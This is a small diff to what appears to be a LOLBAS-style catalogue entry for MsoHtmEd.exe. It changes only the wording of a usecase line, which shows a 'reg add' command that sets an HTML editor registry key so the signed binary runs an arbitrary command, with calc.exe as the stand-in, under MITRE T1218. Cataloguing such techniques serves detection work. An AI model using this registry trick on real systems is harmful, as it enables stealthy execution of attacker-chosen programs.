@@ -6,7 +6,7 @@ Created: 2022-07-24
 Commands:
   - Command: MsoHtmEd.exe https://any-valid-link-to-download-any-html-file-from.com
     Description: Execute a command line from the registry
-    Usecase: Set this registry key with the desired commaned you want to trigger - reg add "HKCU\SOFTWARE\Microsoft\Shared\HTML\Default Editor\shell\edit\command" /f /t REG_SZ /d "calc.exe"
+    Usecase: Set this registry key with the desired commaned you want to trigger (this example executes calc.exe) - reg add "HKCU\SOFTWARE\Microsoft\Shared\HTML\Default Editor\shell\edit\command" /f /t REG_SZ /d "calc.exe"
     Category: Execute
     Privileges: User
     MitreID: T1218
